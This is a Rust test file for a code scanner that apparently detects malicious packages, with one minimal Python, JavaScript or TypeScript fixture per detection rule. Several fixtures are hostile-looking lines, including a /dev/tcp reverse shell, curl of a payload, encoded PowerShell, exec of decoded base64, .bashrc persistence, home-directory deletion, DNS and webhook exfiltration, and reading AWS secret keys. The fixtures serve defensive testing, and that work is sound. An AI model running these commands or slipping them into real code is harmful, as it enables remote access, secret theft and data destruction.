//! One positive test case per built-in rule. Each case writes a minimal source
//! snippet to a temporary directory, scans it with only that rule enabled, and
//! asserts that the rule produces at least one finding.

use std::fs;

use chainsec::{
    model::{EngineLimits, Language, Rule},
    rules, scanner,
};

struct Case {
    rule_id: &'static str,
    file: &'static str,
    source: &'static str,
}

const CASES: &[Case] = &[
    // Built-in Python rules.
    Case {
        rule_id: "PY001",
        file: "case.py",
        source: "eval(user_input)\n",
    },
    Case {
        rule_id: "PY002",
        file: "case.py",
        source: "import base64\nbase64.b64decode(payload)\n",
    },
    Case {
        rule_id: "PY003",
        file: "case.py",
        source: "import os\nos.system(\"ls\")\n",
    },
    Case {
        rule_id: "PY004",
        file: "case.py",
        source: "import requests\nrequests.get(\"https://example.com\")\n",
    },
    Case {
        rule_id: "PY005",
        file: "case.py",
        source: "open(\"data.txt\")\n",
    },
    Case {
        rule_id: "PY006",
        file: "case.py",
        source: "import pickle\npickle.loads(blob)\n",
    },
    // Built-in JavaScript rules.
    Case {
        rule_id: "JS001",
        file: "case.js",
        source: "eval(input);\n",
    },
    Case {
        rule_id: "JS002",
        file: "case.js",
        source: "atob(payload);\n",
    },
    Case {
        rule_id: "JS003",
        file: "case.js",
        source: "exec(\"ls\");\n",
    },
    Case {
        rule_id: "JS004",
        file: "case.js",
        source: "fetch(\"https://example.com\");\n",
    },
    Case {
        rule_id: "JS005",
        file: "case.js",
        source: "console.log(process.env.HOME);\n",
    },
    Case {
        rule_id: "JS006",
        file: "case.js",
        source: "require(moduleName);\n",
    },
    // Built-in TypeScript rules.
    Case {
        rule_id: "TS001",
        file: "case.ts",
        source: "eval(input);\n",
    },
    Case {
        rule_id: "TS002",
        file: "case.ts",
        source: "atob(payload);\n",
    },
    Case {
        rule_id: "TS003",
        file: "case.ts",
        source: "spawn(\"ls\");\n",
    },
    Case {
        rule_id: "TS004",
        file: "case.ts",
        source: "fetch(\"https://example.com\");\n",
    },
    Case {
        rule_id: "TS005",
        file: "case.ts",
        source: "console.log(process.env.HOME);\n",
    },
    // High-entropy string rules.
    Case {
        rule_id: "PY_HIGH_ENTROPY_STRING",
        file: "case.py",
        source: "token = \"aZ8xK2vQ9wN4rT7yU1iO5pL3sD6fG0hJ9kM2nB8vC4xZ\"\n",
    },
    Case {
        rule_id: "JS_HIGH_ENTROPY_STRING",
        file: "case.js",
        source: "const token = \"aZ8xK2vQ9wN4rT7yU1iO5pL3sD6fG0hJ9kM2nB8vC4xZ\";\n",
    },
    Case {
        rule_id: "TS_HIGH_ENTROPY_STRING",
        file: "case.ts",
        source: "const token = \"aZ8xK2vQ9wN4rT7yU1iO5pL3sD6fG0hJ9kM2nB8vC4xZ\";\n",
    },
    // GuardDog capability rules (Python).
    Case {
        rule_id: "GD_CAPABILITY_FILESYSTEM_BROWSER_PY",
        file: "case.py",
        source: "path = \"~/Library/Safari/LocalStorage\"\n",
    },
    Case {
        rule_id: "GD_CAPABILITY_FILESYSTEM_DELETE_PY",
        file: "case.py",
        source: "import shutil\nshutil.rmtree(\"/tmp/stale\")\n",
    },
    Case {
        rule_id: "GD_CAPABILITY_FILESYSTEM_READ_PY",
        file: "case.py",
        source: "from pathlib import Path\nPath(\"data.txt\").read_text()\n",
    },
    Case {
        rule_id: "GD_CAPABILITY_FILESYSTEM_WRITE_EXECUTABLE_PY",
        file: "case.py",
        source: "import os\nos.chmod(\"tool.sh\", 0o755)\n",
    },
    Case {
        rule_id: "GD_CAPABILITY_NETWORK_DOWNLOAD_PY",
        file: "case.py",
        source: "import wget\nwget.download(\"https://example.com/f.bin\")\n",
    },
    Case {
        rule_id: "GD_CAPABILITY_NETWORK_OUTBOUND_PY",
        file: "case.py",
        source: "import urllib.request\nurllib.request.urlopen(\"https://example.com\")\n",
    },
    Case {
        rule_id: "GD_CAPABILITY_NETWORK_LOLBAS_PY",
        file: "case.py",
        source: "import os\nos.system(\"curl https://example.com/payload\")\n",
    },
    Case {
        rule_id: "GD_CAPABILITY_PROCESS_SCHEDULE_PY",
        file: "case.py",
        source: "from crontab import CronTab\nCronTab(user=\"root\")\n",
    },
    Case {
        rule_id: "GD_CAPABILITY_PROCESS_SPAWN_PY",
        file: "case.py",
        source: "import os\nos.spawnl(os.P_NOWAIT, \"/bin/ls\")\n",
    },
    Case {
        rule_id: "GD_CAPABILITY_RUNTIME_CLIPBOARD_PY",
        file: "case.py",
        source: "import pyperclip\npyperclip.paste()\n",
    },
    // GuardDog capability rules (JavaScript/TypeScript share queries).
    Case {
        rule_id: "GD_CAPABILITY_FILESYSTEM_BROWSER_JS",
        file: "case.js",
        source: "const store = \"chrome-cookies-secure\";\n",
    },
    Case {
        rule_id: "GD_CAPABILITY_FILESYSTEM_BROWSER_TS",
        file: "case.ts",
        source: "const store = \"chrome-cookies-secure\";\n",
    },
    Case {
        rule_id: "GD_CAPABILITY_FILESYSTEM_DELETE_JS",
        file: "case.js",
        source: "fs.rmSync(\"/tmp/stale\", { recursive: true });\n",
    },
    Case {
        rule_id: "GD_CAPABILITY_FILESYSTEM_DELETE_TS",
        file: "case.ts",
        source: "fs.rmSync(\"/tmp/stale\", { recursive: true });\n",
    },
    Case {
        rule_id: "GD_CAPABILITY_FILESYSTEM_READ_JS",
        file: "case.js",
        source: "fs.readFileSync(\"data.txt\");\n",
    },
    Case {
        rule_id: "GD_CAPABILITY_FILESYSTEM_READ_TS",
        file: "case.ts",
        source: "fs.readFileSync(\"data.txt\");\n",
    },
    Case {
        rule_id: "GD_CAPABILITY_FILESYSTEM_WRITE_EXECUTABLE_JS",
        file: "case.js",
        source: "fs.chmodSync(\"tool.sh\", 0o755);\n",
    },
    Case {
        rule_id: "GD_CAPABILITY_FILESYSTEM_WRITE_EXECUTABLE_TS",
        file: "case.ts",
        source: "fs.chmodSync(\"tool.sh\", 0o755);\n",
    },
    Case {
        rule_id: "GD_CAPABILITY_NETWORK_DOWNLOAD_JS",
        file: "case.js",
        source: "got(\"https://example.com/f.bin\");\n",
    },
    Case {
        rule_id: "GD_CAPABILITY_NETWORK_DOWNLOAD_TS",
        file: "case.ts",
        source: "got(\"https://example.com/f.bin\");\n",
    },
    Case {
        rule_id: "GD_CAPABILITY_NETWORK_OUTBOUND_JS",
        file: "case.js",
        source: "dns.lookup(\"example.com\");\n",
    },
    Case {
        rule_id: "GD_CAPABILITY_NETWORK_OUTBOUND_TS",
        file: "case.ts",
        source: "dns.lookup(\"example.com\");\n",
    },
    Case {
        rule_id: "GD_CAPABILITY_NETWORK_LOLBAS_JS",
        file: "case.js",
        source: "exec(\"curl https://example.com/payload\");\n",
    },
    Case {
        rule_id: "GD_CAPABILITY_NETWORK_LOLBAS_TS",
        file: "case.ts",
        source: "exec(\"curl https://example.com/payload\");\n",
    },
    Case {
        rule_id: "GD_CAPABILITY_PROCESS_SCHEDULE_JS",
        file: "case.js",
        source: "const cron = require(\"node-cron\");\n",
    },
    Case {
        rule_id: "GD_CAPABILITY_PROCESS_SCHEDULE_TS",
        file: "case.ts",
        source: "import cron from \"node-cron\";\n",
    },
    Case {
        rule_id: "GD_CAPABILITY_PROCESS_SPAWN_JS",
        file: "case.js",
        source: "child_process.execSync(\"ls\");\n",
    },
    Case {
        rule_id: "GD_CAPABILITY_PROCESS_SPAWN_TS",
        file: "case.ts",
        source: "child_process.execSync(\"ls\");\n",
    },
    Case {
        rule_id: "GD_CAPABILITY_RUNTIME_CLIPBOARD_JS",
        file: "case.js",
        source: "clipboardy.readSync();\n",
    },
    Case {
        rule_id: "GD_CAPABILITY_RUNTIME_CLIPBOARD_TS",
        file: "case.ts",
        source: "clipboardy.readSync();\n",
    },
    // GuardDog threat rules (Python).
    Case {
        rule_id: "GD_THREAT_FILESYSTEM_AUTOSTART_PY",
        file: "case.py",
        source: "open(\"/home/user/.bashrc\", \"a\")\n",
    },
    Case {
        rule_id: "GD_THREAT_FILESYSTEM_DESTRUCTION_PY",
        file: "case.py",
        source: "import shutil\nshutil.rmtree(\"/home/user\")\n",
    },
    Case {
        rule_id: "GD_THREAT_NETWORK_DNS_EXFIL_PY",
        file: "case.py",
        source: "import socket\nsocket.gethostbyname(secret + \".example.com\")\n",
    },
    Case {
        rule_id: "GD_THREAT_NETWORK_EXFIL_MESSENGER_PY",
        file: "case.py",
        source: "url = \"https://api.telegram.org/bot123456:AAH8fK2vQ9wN4rT7yU1iO5pL3sD6fG0hJ9k/sendMessage\"\n",
    },
    Case {
        rule_id: "GD_THREAT_NETWORK_OUTBOUND_SHADY_LINKS_PY",
        file: "case.py",
        source: "callback = \"https://webhook.site/abc-def\"\n",
    },
    Case {
        rule_id: "GD_THREAT_NETWORK_REVERSE_SHELL_PY",
        file: "case.py",
        source: "import os\nos.system(\"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\")\n",
    },
    Case {
        rule_id: "GD_THREAT_PROCESS_CRYPTOMINING_PY",
        file: "case.py",
        source: "miner = \"xmrig\"\n",
    },
    Case {
        rule_id: "GD_THREAT_PROCESS_DOWNLOAD_EXEC_PY",
        file: "case.py",
        source: "import os\nos.system(\"pip install evil-package\")\n",
    },
    Case {
        rule_id: "GD_THREAT_PROCESS_POWERSHELL_ENCODED_PY",
        file: "case.py",
        source: "import os\nos.system(\"powershell -EncodedCommand SQBFAFgAIAAoACcAAG4AZQB3AC0A\")\n",
    },
    Case {
        rule_id: "GD_THREAT_RUNTIME_OBFUSCATION_BASE64EXEC_PY",
        file: "case.py",
        source: "import base64\nexec(base64.b64decode(blob))\n",
    },
    Case {
        rule_id: "GD_THREAT_RUNTIME_OBFUSCATION_IMPORT_EXEC_PY",
        file: "case.py",
        source: "exec(__import__(\"os\"))\n",
    },
    Case {
        rule_id: "GD_THREAT_RUNTIME_OBFUSCATION_API_PY",
        file: "case.py",
        source: "getattr(mod, \"exec\")(\"code\")\n",
    },
    Case {
        rule_id: "GD_THREAT_RUNTIME_OBFUSCATION_PYARMOR_PY",
        file: "case.py",
        source: "__pyarmor__(__name__, __file__, b'payload')\n",
    },
    Case {
        rule_id: "GD_THREAT_RUNTIME_SCREENCAPTURE_PY",
        file: "case.py",
        source: "import pyautogui\npyautogui.screenshot()\n",
    },
    Case {
        rule_id: "GD_THREAT_RUNTIME_ENVIRONMENT_READ_PY",
        file: "case.py",
        source: "import os\nos.getenv(\"AWS_SECRET_ACCESS_KEY\")\n",
    },
    // GuardDog threat rules (JavaScript/TypeScript share queries).
    Case {
        rule_id: "GD_THREAT_FILESYSTEM_AUTOSTART_JS",
        file: "case.js",
        source: "fs.appendFileSync(\"/home/user/.bashrc\", \"payload\");\n",
    },
    Case {
        rule_id: "GD_THREAT_FILESYSTEM_AUTOSTART_TS",
        file: "case.ts",
        source: "fs.appendFileSync(\"/home/user/.bashrc\", \"payload\");\n",
    },
    Case {
        rule_id: "GD_THREAT_FILESYSTEM_DESTRUCTION_JS",
        file: "case.js",
        source: "rimraf(\"/home/user\");\n",
    },
    Case {
        rule_id: "GD_THREAT_FILESYSTEM_DESTRUCTION_TS",
        file: "case.ts",
        source: "rimraf(\"/home/user\");\n",
    },
    Case {
        rule_id: "GD_THREAT_NETWORK_EXFIL_MESSENGER_JS",
        file: "case.js",
        source: "const url = \"https://discord.com/api/webhooks/1234567890/abcdefghijklmnopqrstuvwxyz\";\n",
    },
    Case {
        rule_id: "GD_THREAT_NETWORK_EXFIL_MESSENGER_TS",
        file: "case.ts",
        source: "const url = \"https://discord.com/api/webhooks/1234567890/abcdefghijklmnopqrstuvwxyz\";\n",
    },
    Case {
        rule_id: "GD_THREAT_NETWORK_OUTBOUND_SHADY_LINKS_JS",
        file: "case.js",
        source: "const callback = \"https://ngrok.io/tunnel\";\n",
    },
    Case {
        rule_id: "GD_THREAT_NETWORK_OUTBOUND_SHADY_LINKS_TS",
        file: "case.ts",
        source: "const callback = \"https://ngrok.io/tunnel\";\n",
    },
    Case {
        rule_id: "GD_THREAT_NETWORK_REVERSE_SHELL_JS",
        file: "case.js",
        source: "exec(\"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\");\n",
    },
    Case {
        rule_id: "GD_THREAT_NETWORK_REVERSE_SHELL_TS",
        file: "case.ts",
        source: "exec(\"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\");\n",
    },
    Case {
        rule_id: "GD_THREAT_PROCESS_CRYPTOMINING_JS",
        file: "case.js",
        source: "const miner = \"xmrig\";\n",
    },
    Case {
        rule_id: "GD_THREAT_PROCESS_CRYPTOMINING_TS",
        file: "case.ts",
        source: "const miner = \"xmrig\";\n",
    },
    Case {
        rule_id: "GD_THREAT_PROCESS_DOWNLOAD_EXEC_JS",
        file: "case.js",
        source: "exec(\"npm install evil-package\");\n",
    },
    Case {
        rule_id: "GD_THREAT_PROCESS_DOWNLOAD_EXEC_TS",
        file: "case.ts",
        source: "exec(\"npm install evil-package\");\n",
    },
    Case {
        rule_id: "GD_THREAT_PROCESS_POWERSHELL_ENCODED_JS",
        file: "case.js",
        source: "exec(\"powershell -EncodedCommand SQBFAFgAIAAoACcAAG4AZQB3AC0A\");\n",
    },
    Case {
        rule_id: "GD_THREAT_PROCESS_POWERSHELL_ENCODED_TS",
        file: "case.ts",
        source: "exec(\"powershell -EncodedCommand SQBFAFgAIAAoACcAAG4AZQB3AC0A\");\n",
    },
    Case {
        rule_id: "GD_THREAT_RUNTIME_OBFUSCATION_BASE64EXEC_JS",
        file: "case.js",
        source: "eval(atob(payload));\n",
    },
    Case {
        rule_id: "GD_THREAT_RUNTIME_OBFUSCATION_BASE64EXEC_TS",
        file: "case.ts",
        source: "eval(atob(payload));\n",
    },
    Case {
        rule_id: "GD_THREAT_RUNTIME_OBFUSCATION_API_JS",
        file: "case.js",
        source: "Object.getOwnPropertyDescriptor(mod, \"run\").value();\n",
    },
    Case {
        rule_id: "GD_THREAT_RUNTIME_OBFUSCATION_API_TS",
        file: "case.ts",
        source: "Object.getOwnPropertyDescriptor(mod, \"run\").value();\n",
    },
    Case {
        rule_id: "GD_THREAT_RUNTIME_OBFUSCATION_HIDDEN_CODE_JS",
        file: "case.js",
        source: "global[\"rq\"] = require;\n",
    },
    Case {
        rule_id: "GD_THREAT_RUNTIME_OBFUSCATION_HIDDEN_CODE_TS",
        file: "case.ts",
        source: "global[\"rq\"] = require;\n",
    },
    Case {
        rule_id: "GD_THREAT_RUNTIME_ENVIRONMENT_READ_JS",
        file: "case.js",
        source: "process.env[\"AWS_SECRET_ACCESS_KEY\"];\n",
    },
    Case {
        rule_id: "GD_THREAT_RUNTIME_ENVIRONMENT_READ_TS",
        file: "case.ts",
        source: "process.env[\"AWS_SECRET_ACCESS_KEY\"];\n",
    },
];

#[test]
fn every_built_in_rule_has_a_test_case() {
    let all_rules = rules::built_in_rules();
    let rule_ids: std::collections::HashSet<&str> =
        all_rules.iter().map(|rule| rule.id.as_str()).collect();
    let case_ids: std::collections::HashSet<&str> = CASES.iter().map(|case| case.rule_id).collect();

    assert_eq!(
        case_ids.len(),
        CASES.len(),
        "duplicate rule ids in CASES table"
    );
    let missing: Vec<&&str> = rule_ids.difference(&case_ids).collect();
    assert!(missing.is_empty(), "rules without test cases: {missing:?}");
    let unknown: Vec<&&str> = case_ids.difference(&rule_ids).collect();
    assert!(
        unknown.is_empty(),
        "test cases for unknown rules: {unknown:?}"
    );
}

#[test]
fn every_rule_matches_its_fixture() {
    let all_rules = rules::built_in_rules();
    for case in CASES {
        let rule: &Rule = all_rules
            .iter()
            .find(|rule| rule.id == case.rule_id)
            .unwrap_or_else(|| panic!("unknown rule {}", case.rule_id));
        assert_language_extension(rule, case);

        let directory = tempfile::tempdir().unwrap();
        let file = directory.path().join(case.file);
        fs::write(&file, case.source).unwrap();

        let outcome = scanner::scan(
            directory.path(),
            "fixture",
            std::slice::from_ref(rule),
            &EngineLimits::default(),
        )
        .unwrap_or_else(|error| panic!("scan failed for {}: {error}", case.rule_id));

        assert!(
            outcome
                .findings
                .iter()
                .any(|finding| finding.rule_id == case.rule_id),
            "rule {} did not match its fixture:\n{}",
            case.rule_id,
            case.source
        );
    }
}

fn assert_language_extension(rule: &Rule, case: &Case) {
    let expected = match rule.language {
        Language::Python => "case.py",
        Language::JavaScript => "case.js",
        Language::TypeScript => "case.ts",
    };
    assert_eq!(
        case.file, expected,
        "rule {} fixture {} does not match its language {:?}",
        rule.id, case.file, rule.language
    );
}

#[test]
fn every_rule_compiles() {
    scanner::validate_rules(&rules::built_in_rules()).unwrap();
}
